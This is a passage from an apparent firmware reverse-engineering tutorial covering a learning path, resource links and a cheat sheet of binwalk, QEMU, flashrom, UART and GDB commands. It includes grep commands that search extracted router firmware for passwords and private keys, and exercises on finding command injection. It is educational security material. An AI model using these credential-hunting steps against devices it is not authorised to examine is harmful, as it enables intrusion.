→ Known CVEs to research and reproduce
→ UART accessible
→ OpenWrt support (compare stock vs open firmware)
→ Cheap if you brick it
```

### Practice Firmware (Download, Don't Need Hardware)

```bash
# Download real firmware to analyze
# TP-Link archive: https://www.tp-link.com/us/support/download/
# Netgear: https://www.netgear.com/support/download/
# D-Link: https://support.dlink.com/

# Practice exercises:
# 1. Extract and find the default WiFi password generation algorithm
# 2. Find all enabled services
# 3. Identify CVEs that may apply
# 4. Find command injection in web interface

# Vulnerable firmware images for research:
# vulhub/iot-firmware (GitHub)
# firmwalker (scan extracted firmware for issues)
```

### Online Resources

| Resource | URL | Content |
|---|---|---|
| **IoTSecurity101** | iotsecurity101.com | IoT RE guide |
| **/dev/ttypwn** | blog.attify.com | Firmware RE articles |
| **Exploit-DB** | exploit-db.com | Real router exploits to study |
| **Router Exploitation** | github.com/hackthedot | Scripts and guides |
| **ARM Assembly Guide** | azeria-labs.com | Best ARM assembly tutorial |
| **MIPS Assembly** | chortle.ccsu.edu/assemblytutorial | MIPS reference |

### Suggested Learning Path

```
Week 1: Foundations
→ Download 3 different router firmwares
→ Run binwalk on all of them
→ Compare their filesystems and configurations

Week 2: Credential Hunting
→ Extract each firmware's filesystem
→ Find all credentials and config files
→ Check for telnet, default passwords, SSL certs

Week 3: Binary Analysis
→ Open the main web server binary in Ghidra
→ Find calls to system() and strcpy()
→ Understand the web request handling flow

Week 4: Emulation
→ Set up QEMU chroot
→ Run the web server inside QEMU
→ Access the web interface from your browser

Month 2+:
→ Buy a cheap router and practice UART access
→ Reproduce a known CVE from Exploit-DB
→ Set up full system emulation with Firmadyne
→ Try to find a new bug in a device
```

---

## Quick Reference Cheatsheet

### Binwalk Commands
```bash
binwalk firmware.bin           # Analyze
binwalk -E firmware.bin        # Entropy graph
binwalk -e firmware.bin        # Extract all
binwalk -M -e firmware.bin     # Recursive extraction
```

### Firmware Search Commands
```bash
grep -r "password" squashfs-root/etc/ -i
grep -r "BEGIN.*PRIVATE KEY" squashfs-root/ -l
find squashfs-root/ -name "*.cgi" | xargs grep "system("
strings squashfs-root/usr/sbin/httpd | grep "http\|admin\|pass"
```

### QEMU Quick Start
```bash
# Copy QEMU binary to firmware root
sudo cp /usr/bin/qemu-mips-static squashfs-root/usr/bin/

# Chroot into firmware
sudo chroot squashfs-root/ /bin/sh
```

### Hardware Attack Quickref
```bash
# SPI Flash dump
flashrom -p ch341a_spi -r firmware.bin

# UART connect
screen /dev/ttyUSB0 115200

# GDB remote debug
gdb-multiarch ./binary
(gdb) target remote 192.168.1.1:1234
```

---

*Part of the Complete Reverse Engineering Series*
*You now have: Binary RE + Web RE + Mobile RE + Network RE + Firmware RE*
````
